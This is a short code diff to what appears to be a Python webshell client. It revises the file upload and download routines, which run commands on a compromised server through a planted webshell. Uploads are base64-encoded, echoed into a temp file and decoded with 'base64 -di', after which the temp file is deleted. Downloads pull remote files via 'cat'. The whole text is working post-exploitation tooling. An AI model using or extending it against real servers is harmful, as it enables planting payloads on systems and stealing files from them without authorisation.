@@ -81,10 +81,9 @@ try:
                    remotefiletmp = path.rstrip() + slash + command.split()[2] + ".tmp"
                 if not slash in localfile:
                    cwd = os.getcwd()
-                print (colored("Uploading file "+ cwd + slash + localfile +" on "+ remotefile +"..\n", "yellow"))
-                f = open(localfile, "r")
-                rawfiledata = f.read() ; base64data = base64.b64encode(rawfiledata.encode("utf-8"))
-                send_command("echo " + str(base64data.rstrip(), "utf-8") + (' > ') + remotefiletmp, WEBSHELL, HTTP_METHOD, PARAM)
+                print (colored("Uploading file "+ cwd + "/" + localfile +" on "+ remotefile +"..\n", "yellow"))
+                f = open(localfile, "rb") ; rawfiledata = f.read() ; base64data = base64.b64encode(rawfiledata)
+                upload = send_command("echo " + str(base64data.rstrip(), "utf-8") + (' > ') + remotefiletmp, WEBSHELL, HTTP_METHOD, PARAM)
                 if system == "linux":
                    send_command("base64 -di " + remotefiletmp + (' > ') + remotefile + " ; rm -f " + remotefiletmp, WEBSHELL, HTTP_METHOD, PARAM)
                 if system == "windows":
@@ -98,7 +97,7 @@ try:
                       remotefile = path.rstrip() + slash + command.split()[1]
                    if not slash in localfile:
                       cwd = os.getcwd()
-                   print (colored("Downloading file "+ remotefile +" on "+ cwd + slash + localfile +"..\n", "yellow"))
+                   print (colored("Downloading file "+ remotefile +" on "+ cwd + "/" + localfile +"..\n", "yellow"))
                    download = send_command("cat " + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
                    f = open(localfile, "w")
                    f.write(download)
